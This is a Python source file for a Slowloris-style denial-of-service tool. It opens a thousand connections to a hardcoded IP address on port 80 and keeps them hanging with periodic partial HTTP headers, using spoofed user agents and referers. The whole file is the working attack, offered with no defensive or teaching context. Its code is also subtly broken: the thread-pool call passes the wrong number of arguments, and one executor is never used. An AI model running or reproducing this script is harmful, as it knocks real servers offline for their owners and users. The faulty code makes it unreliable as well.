# Libraries
import os
import time
import random
from typing import Optional
from concurrent.futures import ThreadPoolExecutor

from utils.files import Files as fls
from utils.messages import Messages as msg
from core.slowsock import Slowsock

# Constants
CONNECTIONS_AMOUNT = 1000
MAX_THREADS_AMOUNT = os.cpu_count() + 4
TARGET_ADDRESS = "92.222.117.57"
TARGET_PORT = 80
WAIT_TIME = 0.5
TIMEOUT = 15
USER_AGENTS = fls.read_file("files/user-agents.txt")
REFERERS = fls.read_file("files/referers.txt")


# Function to create a socket
def create_socket() -> Optional[Slowsock]:
    try:
        socket = Slowsock(
            host=TARGET_ADDRESS,
            port=TARGET_PORT,
            timeout=TIMEOUT,
            path=f"/?{random.randint(0, 2000)}",
            user_agent=random.choice(USER_AGENTS),
            referer=random.choice(REFERERS),
        )
        socket.initiate_connection()
        return socket
    except Slowsock.TimeoutError:
        return None
    except Exception as error:
        msg.show_error(f"An unexpected error occurred while creating a socket: {error}")


# Function to create a set of sockets
def create_socket_set(socket_amount: int) -> set[Slowsock]:
    socket_set = set()
    with ThreadPoolExecutor(max_workers=MAX_THREADS_AMOUNT) as executor:
        while len(socket_set) < socket_amount:
            socket = create_socket()
            if socket:
                socket_set.add(socket)
    return socket_set


# Function to send data through a socket
def send_data(socket, socket_set):
    header = f"X-a: {random.randint(1, 5000)}\r\n"
    socket.send_data(header)
    if socket.get_status() != 2:
        socket_set.remove(socket)


# Main function
if __name__ == "__main__":
    try:
        # Create a set of sockets
        msg.show_info(f"Creating {CONNECTIONS_AMOUNT} connections...\n")
        socket_set = create_socket_set(CONNECTIONS_AMOUNT)

        # Maintain the connection alive
        msg.show_info("Ensuring each connection stays alive...\n")
        while True:
            # Try to send data through each socket
            msg.show_info("Sending data through each socket...")
            with ThreadPoolExecutor(max_workers=MAX_THREADS_AMOUNT) as executor:
                executor.map(send_data, socket_set)

            # Create sockets if some have been closed
            required_amount = CONNECTIONS_AMOUNT - len(socket_set)
            if required_amount > 0:
                msg.show_warning("Some sockets were lost.")
                msg.show_info(f"Creating {required_amount} sockets...")
                new_sockets = create_socket_set(required_amount)
                socket_set.update(new_sockets)

            # Wait for a while
            msg.show_info(f"Waiting {WAIT_TIME} seconds before continuing...\n")
            time.sleep(WAIT_TIME)
    except KeyboardInterrupt:
        msg.show_info("Stopping the connection...")
    except Exception as error:
        msg.show_error(f"An unexpected error occurred: {error}")
